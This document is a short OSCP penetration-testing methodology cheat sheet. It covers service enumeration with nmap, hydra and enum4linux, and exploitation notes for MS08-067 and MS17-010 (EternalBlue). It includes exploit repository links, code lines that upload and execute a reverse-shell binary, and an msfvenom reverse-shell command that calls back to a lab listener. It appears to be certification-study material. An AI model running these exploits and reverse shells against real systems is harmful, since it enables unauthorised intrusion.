# oscp_methodology
OSCP Methodology


## Blackbox
#### nmap full tcp port scan
* nmap <ip> -sV -sC -O -T4 --traceroute -p - -oA ~/path/filename

#### Ftp
* service -> exploit
* banner
* default creds (hydra)
* default creds with nsr (hydra)
* Anonymous login
* Put files
* nmap info

#### SSH
* service -> exploit
* banner
* default creds (hydra)
* default creds with nsr (hydra)
* nmap info

#### Samba
* nmap info:
  * OS samba
  * Computer name/NetBIOS name
  * Domain name
  * Workgroup
  * OS of machine

* service (OS samba or nmap service header (139 & 445)) -> exploit
* nmap -sV -sC --open -T4  -p 139,445 --script=vuln --script-args=unsafe=1 <ip>
* enum4linux
* smbclient
 

## Exploits
### Windows
#### MS08-067
git clone https://github.com/andyacer/ms08_067.git
* configuration
  * pip install impacket
* 2 reverse options for shellcoding:
  * Use the third with 443
  * Use the third with default
  * Use second with default
  * Use second with port of third or another port
* Choose the right option of menu.
  * Find OS of machine
  * Guess lanhuage
* Needs listener

### Windows
#### MS17-010
git clone https://github.com/worawit/MS17-010.git

##### zzz_exploit.py:
 * If needed USERNAME-"//"
 * next add the following 2 lines to below def smb
   
   smb_send_file(smbConn, '/root/htb/blue/puckieshell443.exe', 'C', '/puckieshell443.exe')
   
   service_exec(conn, r'cmd /c c:\\puckieshell443.exe')
 
* custom payload:
  * msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.28 LPORT=443 -f exe > shell.exe

* Need listener

##### eternalblue_exploit7.py

* use the https://github.com/nickvourd/eternalblue_win7_auto_gen in order to merge binaries nad payload
* Run the following: python MS17-010/eternalblue_exploit7.py <ip> /tmp/sc_x<arch>.bin
* Need listener

 
